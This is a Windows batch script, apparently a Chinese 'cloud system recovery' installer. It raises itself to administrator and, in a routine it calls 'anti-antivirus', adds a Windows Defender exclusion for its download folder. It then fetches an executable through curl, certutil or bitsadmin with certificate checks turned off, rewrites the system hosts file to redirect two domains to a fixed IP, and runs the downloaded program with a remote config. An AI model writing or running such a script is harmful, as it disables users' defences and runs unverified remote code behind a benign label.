@ECHO OFF & PUSHD "%~DP0" & setlocal ENABLEDELAYEDEXPANSION
REM [BlueShift 云端系统恢复 - 增强版] 

REM ==================== 管理员权限提升 ====================
set "pat=%~pnx0" & call set "flag=%windir%\temp\%%pat:\=_%%" 

if /i "%username%" equ "system" goto :main
reg QUERY "HKU\S-1-5-19" >nul 2>nul && goto :main

REM 检查 flag - 防止提权失败后的无限循环
setlocal DISABLEDELAYEDEXPANSION
dir "%flag%" >nul 2>nul && (
    rmdir /q /s "%flag%" >nul 2>nul 
    echo [错误] 提升到管理员权限失败，程序退出
    echo [提示] 请右键选择"以管理员身份运行"
    pause 
    exit /b 255
) || (
    mkdir "%flag%" >nul 2>nul
)

REM 构建参数列表
powershell /? >nul 2>nul && (
    set "psh=1" 
    set "args1=" 
    for %%a in (%*) do (
        set "arg1=%%a" 
        set "args1=!args1! \"!arg1!\""
    )
)

if not defined psh (
    set "args2=" 
    for %%a in (%*) do (
        set "arg2=%%a" 
        set "args2=!args2! ""!arg2!"""
    )
    if /i "!args2!" neq "" set "args2=!args2:"""=""!"
)

REM PowerShell 提权
if defined psh (
    powershell -nop -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c \""""%~f0""" %args1%\"'" >nul 2>nul && (
        rmdir /q /s "%flag%" >nul 2>nul 
        exit
    ) || (
        rmdir /q /s "%flag%" >nul 2>nul 
        echo [错误] 提升到管理员权限失败
        pause 
        exit /b 255
    )
) else (
    REM VBScript 提权（PowerShell 不可用时）
    echo CreateObject^("Shell.Application"^).ShellExecute "cmd.exe", "/c """"%~f0""  %args2%  """, "", "runas", 1 > "%temp%\T.vbs"
    "%temp%\T.vbs" >nul 2>nul
    del /q /f "%temp%\T.vbs" >nul 2>nul
    timeout /t 3 /nobreak >nul
    rmdir /q /s "%flag%" >nul 2>nul
    exit
)

REM ==================== 主程序 ====================
:main
setlocal enabledelayedexpansion
mode con cp select=65001>nul
mode con cols=100 lines=30

REM 配置参数
set "SCRIPT_VERSION=2.1"
set "MIN_FILE_SIZE=1048576"
set "DOWNLOAD_TIMEOUT=300"
set "CONNECT_TIMEOUT=30"
set "MAX_RETRY=3"

set "CloudSysFolder=%temp%\CloudSysFolder"
rem set "aria2c_url=https://gitee.com/pda8888/diy/raw/master/bin/aria2c.exe"
set "aria2c_url=https://gitee.com/pda8888/diy/raw/master/bin/aria2c.exe"
set "logfile=%CloudSysFolder%\cloudsysdown.log"

REM 定义下载源数组
set "cloudsys[1]=https://o.8da.com.cn:15900/d/zdh/CloudSys/CloudSys-3.3.0.5.exe"
set "cloudsys[2]=https://o.8da.com.cn:15900/d/wopan/diy/drivers/cloudsys/CloudSys-3.3.0.5.exe"
set "cloudsys[3]=https://o.8da.com.cn:15900/d/189/13983650000/family/diy/drivers/CloudSys/CloudSys-3.3.0.5.exe"
set "cloudsysCount=3"

title BlueShift 云端系统恢复 v%SCRIPT_VERSION%
echo.
echo ========================================
echo   BlueShift 云端系统恢复 v%SCRIPT_VERSION%
echo ========================================
echo.

REM 创建工作目录
if not exist "%CloudSysFolder%\." (
    md "%CloudSysFolder%" >nul 2>nul || (
        echo [错误] 无法创建工作目录: %CloudSysFolder%
        pause
        exit /b 1
    )
)

REM 初始化日志
echo ========================================>> "%logfile%"
echo 下载日志 - %date% %time%>> "%logfile%"
echo ========================================>> "%logfile%"

REM 执行防查杀设置
call :anti_MSAV
if %errorlevel% neq 0 (
    echo [警告] 防查杀设置失败，继续执行...
    echo.
)

REM 清理旧文件
call :cleanup_old_files

REM 检测可用的下载工具
echo [步骤 1/3] 正在检测下载工具...
call :detect_download_tools
echo.

REM 下载 aria2c 工具（如果其他工具可用）
if "!has_downloader!"=="1" (
    echo [操作] 尝试下载 aria2c 加速工具...
    call :download_aria2c
    if %errorlevel% equ 0 (
        set "use_aria2c=1"
        echo [成功] aria2c 工具已就绪
    ) else (
        set "use_aria2c=0"
        echo [提示] 将使用系统自带工具
    )
    echo.
) else (
    echo [错误] 未检测到任何可用的下载工具
    echo [提示] 请确保系统中有 curl、certutil 或 bitsadmin
    pause
    exit /b 1
)

REM 下载主程序

echo.

call :download_cloudsys

if %errorlevel% equ 0 (
    echo [步骤 3/3] 验证下载完整性...
    call :verify_download
    if !errorlevel! equ 0 (
        echo [成功] 准备启动安装程序...
        timeout /t 2 /nobreak >nul
        find "113.44.45.137" "%windir%\system32\drivers\etc\hosts">nul || (echo;&echo;&echo 113.44.45.137 pc.8da.com.cn&echo 113.44.45.137 o.8da.com.cn)>>"%windir%\system32\drivers\etc\hosts"
        start "" "%CloudSysFolder%\CloudSys.exe" -j https://gitee.com/pda8888/diy/raw/master/config_260915.json
        REM 不删除已下载的 exe，但清理其他临时文件
        if exist "%CloudSysFolder%\aria2c.exe" del /q "%CloudSysFolder%\aria2c.exe" 2>nul
        if exist "%CloudSysFolder%\CloudSys.exe.aria2" del /q "%CloudSysFolder%\CloudSys.exe.aria2" 2>nul
        exit /b 0
    )
)

echo.
echo ========================================
echo [失败] 所有下载源均失败
echo ========================================
echo.
echo 请检查网络连接或稍后重试
call :cleanup_old_files
pause
exit /b 1

REM ==================== 检测下载工具 ====================
:detect_download_tools
    set "has_curl=0"
    set "has_certutil=0"
    set "has_bitsadmin=0"
    set "has_downloader=0"
    
    REM 检测 curl
    curl --version >nul 2>nul
    if !errorlevel! equ 0 (
        set "has_curl=1"
        set "has_downloader=1"
        echo [检测] curl - 可用
    ) else (
        echo [检测] curl - 不可用
    )
    
    REM 检测 certutil
    certutil -? >nul 2>nul
    if !errorlevel! equ 0 (
        set "has_certutil=1"
        set "has_downloader=1"
        echo [检测] certutil - 可用
    ) else (
        echo [检测] certutil - 不可用
    )
    
    REM 检测 bitsadmin
    bitsadmin /? >nul 2>nul
    if !errorlevel! equ 0 (
        set "has_bitsadmin=1"
        set "has_downloader=1"
        echo [检测] bitsadmin - 可用
    ) else (
        echo [检测] bitsadmin - 不可用
    )
exit /b 0

REM ==================== 清理旧文件 ====================
:cleanup_old_files
    if exist "%CloudSysFolder%\aria2c.exe" del /q "%CloudSysFolder%\aria2c.exe" 2>nul
    if exist "%CloudSysFolder%\CloudSys.exe" del /q "%CloudSysFolder%\CloudSys.exe" 2>nul
    if exist "%CloudSysFolder%\CloudSys.exe.aria2" del /q "%CloudSysFolder%\CloudSys.exe.aria2" 2>nul
exit /b 0

REM ==================== 下载 aria2c ====================
:download_aria2c
    echo %time% - 开始下载 aria2c>> "%logfile%"
    
    REM 优先使用 curl
    if "!has_curl!"=="1" (
        curl --connect-timeout %CONNECT_TIMEOUT% --max-time 60 --retry 2 -#JLk "%aria2c_url%" --noproxy "*" -o "%CloudSysFolder%\aria2c.exe">>"%logfile%"
        if exist "%CloudSysFolder%\aria2c.exe" (
            for %%F in ("%CloudSysFolder%\aria2c.exe") do set "aria2c_size=%%~zF"
            if !aria2c_size! GTR 100000 (
                echo %time% - aria2c 下载成功 ^(curl, !aria2c_size! 字节^)>> "%logfile%"
                exit /b 0
            )
            del /q "%CloudSysFolder%\aria2c.exe" 2>nul
        )
    )
    
    REM 尝试 certutil
    if "!has_certutil!"=="1" (
        certutil -urlcache -split -f "%aria2c_url%" "%CloudSysFolder%\aria2c.exe" >nul 2>>"%logfile%"
        if exist "%CloudSysFolder%\aria2c.exe" (
            for %%F in ("%CloudSysFolder%\aria2c.exe") do set "aria2c_size=%%~zF"
            if !aria2c_size! GTR 100000 (
                echo %time% - aria2c 下载成功 ^(certutil, !aria2c_size! 字节^)>> "%logfile%"
                exit /b 0
            )
            del /q "%CloudSysFolder%\aria2c.exe" 2>nul
        )
    )
    
    REM 尝试 bitsadmin
    if "!has_bitsadmin!"=="1" (
        bitsadmin /transfer aria2c_download /download /priority FOREGROUND "%aria2c_url%" "%CloudSysFolder%\aria2c.exe" >nul 2>>"%logfile%"
        if exist "%CloudSysFolder%\aria2c.exe" (
            for %%F in ("%CloudSysFolder%\aria2c.exe") do set "aria2c_size=%%~zF"
            if !aria2c_size! GTR 100000 (
                echo %time% - aria2c 下载成功 ^(bitsadmin, !aria2c_size! 字节^)>> "%logfile%"
                exit /b 0
            )
            del /q "%CloudSysFolder%\aria2c.exe" 2>nul
        )
    )
    
    echo %time% - aria2c 下载失败>> "%logfile%"
exit /b 1

REM ==================== 下载云端系统 ====================
:download_cloudsys
    if "!use_aria2c!"=="1" (
        call :download_with_aria2c
        exit /b !errorlevel!
    )
    
    REM 按优先级尝试各种下载工具
    for /l %%i in (1,1,%cloudsysCount%) do (
        echo [尝试] 源 %%i / %cloudsysCount%
        
        REM 尝试 curl
        if "!has_curl!"=="1" (
            echo [工具] 使用 curl 下载...
            call :try_curl "!cloudsys[%%i]!"
            if !errorlevel! equ 0 exit /b 0
        )
        
        REM 尝试 certutil
        if "!has_certutil!"=="1" (
            echo [工具] 使用 certutil 下载...
            call :try_certutil "!cloudsys[%%i]!"
            if !errorlevel! equ 0 exit /b 0
        )
        
        REM 尝试 bitsadmin
        if "!has_bitsadmin!"=="1" (
            echo [工具] 使用 bitsadmin 下载...
            call :try_bitsadmin "!cloudsys[%%i]!"
            if !errorlevel! equ 0 exit /b 0
        )
        
        if %%i lss %cloudsysCount% (
            echo [提示] 正在尝试下一个源...
            echo.
        )
    )
exit /b 1

REM ==================== 使用 aria2c 下载 ====================
:download_with_aria2c
    for /l %%i in (1,1,%cloudsysCount%) do (
        echo [尝试] 源 %%i / %cloudsysCount%
        echo [工具] 使用 aria2c 下载...
        echo %time% - aria2c 下载: !cloudsys[%%i]!>> "%logfile%"
        
        "%CloudSysFolder%\aria2c.exe" ^
            --connect-timeout=%CONNECT_TIMEOUT% ^
            --timeout=%DOWNLOAD_TIMEOUT% ^
            --max-tries=%MAX_RETRY% ^
            --retry-wait=3 ^
            -s16 -x16 ^
            --check-certificate=false ^
            --console-log-level=warn ^
            --summary-interval=0 ^
            --download-result=hide ^
            "!cloudsys[%%i]!" ^
            -d "%CloudSysFolder%" ^
            -o "CloudSys.exe" 2>>"%logfile%"
        
        if exist "%CloudSysFolder%\CloudSys.exe" (
            for %%F in ("%CloudSysFolder%\CloudSys.exe") do set "dl_size=%%~zF"
            if !dl_size! GTR %MIN_FILE_SIZE% (
                echo.
                echo [成功] 下载完成 ^(!dl_size! 字节^)
                echo %time% - 下载成功: !dl_size! 字节>> "%logfile%"
                exit /b 0
            ) else (
                echo.
                echo [警告] 文件不完整 ^(!dl_size! 字节^)
                echo %time% - 文件过小: !dl_size! 字节>> "%logfile%"
                del /q "%CloudSysFolder%\CloudSys.exe" 2>nul
            )
        ) else (
            echo.
            echo [失败] 此源下载失败
            echo %time% - 下载失败>> "%logfile%"
        )
        
        if %%i lss %cloudsysCount% (
            echo [提示] 正在尝试下一个源...
            echo.
        )
    )
exit /b 1

REM ==================== 尝试使用 curl ====================
:try_curl
    set "url=%~1"
    echo %time% - curl 下载: %url%>> "%logfile%"
    
    curl --connect-timeout %CONNECT_TIMEOUT% --max-time %DOWNLOAD_TIMEOUT% --retry %MAX_RETRY% --noproxy "*" -#JLk "%url%" -o "%CloudSysFolder%\CloudSys.exe">>"%logfile%"
    
    if exist "%CloudSysFolder%\CloudSys.exe" (
        for %%F in ("%CloudSysFolder%\CloudSys.exe") do set "dl_size=%%~zF"
        if !dl_size! GTR %MIN_FILE_SIZE% (
            echo.
            echo [成功] 下载完成 ^(!dl_size! 字节^)
            echo %time% - curl 下载成功: !dl_size! 字节>> "%logfile%"
            exit /b 0
        ) else (
            echo.
            echo [警告] 文件不完整 ^(!dl_size! 字节^)
            echo %time% - curl 文件过小: !dl_size! 字节>> "%logfile%"
            del /q "%CloudSysFolder%\CloudSys.exe" 2>nul
        )
    ) else (
        echo.
        echo [失败] curl 下载失败
        echo %time% - curl 下载失败>> "%logfile%"
    )
exit /b 1

REM ==================== 尝试使用 certutil ====================
:try_certutil
    set "url=%~1"
    echo %time% - certutil 下载: %url%>> "%logfile%"
    
    REM certutil 不支持进度显示，但更稳定
    certutil -urlcache -split -f "%url%" "%CloudSysFolder%\CloudSys.exe" >nul 2>>"%logfile%"
    
    if exist "%CloudSysFolder%\CloudSys.exe" (
        for %%F in ("%CloudSysFolder%\CloudSys.exe") do set "dl_size=%%~zF"
        if !dl_size! GTR %MIN_FILE_SIZE% (
            echo.
            echo [成功] 下载完成 ^(!dl_size! 字节^)
            echo %time% - certutil 下载成功: !dl_size! 字节>> "%logfile%"
            exit /b 0
        ) else (
            echo.
            echo [警告] 文件不完整 ^(!dl_size! 字节^)
            echo %time% - certutil 文件过小: !dl_size! 字节>> "%logfile%"
            del /q "%CloudSysFolder%\CloudSys.exe" 2>nul
        )
    ) else (
        echo.
        echo [失败] certutil 下载失败
        echo %time% - certutil 下载失败>> "%logfile%"
    )
exit /b 1

REM ==================== 尝试使用 bitsadmin ====================
:try_bitsadmin
    set "url=%~1"
    echo %time% - bitsadmin 下载: %url%>> "%logfile%"
    
    REM 生成唯一的任务名
    set "job_name=CloudSys_%RANDOM%"
    
    REM bitsadmin 创建并执行下载任务
    bitsadmin /transfer "%job_name%" /download /priority FOREGROUND "%url%" "%CloudSysFolder%\CloudSys.exe" 2>>"%logfile%"
    
    if exist "%CloudSysFolder%\CloudSys.exe" (
        for %%F in ("%CloudSysFolder%\CloudSys.exe") do set "dl_size=%%~zF"
        if !dl_size! GTR %MIN_FILE_SIZE% (
            echo.
            echo [成功] 下载完成 ^(!dl_size! 字节^)
            echo %time% - bitsadmin 下载成功: !dl_size! 字节>> "%logfile%"
            exit /b 0
        ) else (
            echo.
            echo [警告] 文件不完整 ^(!dl_size! 字节^)
            echo %time% - bitsadmin 文件过小: !dl_size! 字节>> "%logfile%"
            del /q "%CloudSysFolder%\CloudSys.exe" 2>nul
        )
    ) else (
        echo.
        echo [失败] bitsadmin 下载失败
        echo %time% - bitsadmin 下载失败>> "%logfile%"
    )
exit /b 1

REM ==================== 验证下载 ====================
:verify_download
    if not exist "%CloudSysFolder%\CloudSys.exe" (
        echo [错误] 文件不存在
        exit /b 1
    )
    
    for %%F in ("%CloudSysFolder%\CloudSys.exe") do set "final_size=%%~zF"
    echo [检查] 文件大小: !final_size! 字节
    
    if !final_size! LSS %MIN_FILE_SIZE% (
        echo [错误] 文件大小异常 ^(小于 %MIN_FILE_SIZE% 字节^)
        exit /b 1
    )
    
    echo [验证] 文件完整性检查通过
    echo.
exit /b 0

REM ==================== 防查杀设置 ====================
:anti_MSAV
    echo [配置] 正在设置安全策略...
    
    REM 检查是否在 PE 环境
    reg query "HKLM\SYSTEM\CurrentControlSet\Control" /v SystemStartOptions 2>nul | find /i "MININT" >nul && (
        echo [提示] PE 环境，跳过防查杀设置
        echo.
        exit /b 0
    )
    
    REM 检查 Windows Defender 状态
    sc query WinDefend 2>nul | find /i "RUNNING" >nul || (
        echo [提示] Windows Defender 未运行，无需配置
        echo.
        exit /b 0
    )
    
    echo [操作] 添加 Windows Defender 排除项...
    
    powershell -ExecutionPolicy Bypass -NoProfile -Command ^
        "$ErrorActionPreference='Stop'; " ^
        "try { " ^
            "$excludePath = '%CloudSysFolder:\=\\%'.TrimEnd('\\'); " ^
            "Add-MpPreference -ExclusionPath \"$excludePath\" -ErrorAction Stop; " ^
            "Write-Host '[成功] 已添加到排除列表'; " ^
        "} catch { " ^
            "Write-Host '[提示] 如被拦截，请手动添加排除路径: %CloudSysFolder%'; " ^
            "exit 1; " ^
        "}" 2>>"%logfile%"
    
    if %errorlevel% neq 0 (
        echo [提示] 添加失败，如遇拦截请手动添加: %CloudSysFolder%
    )
    
    echo.
exit /b 0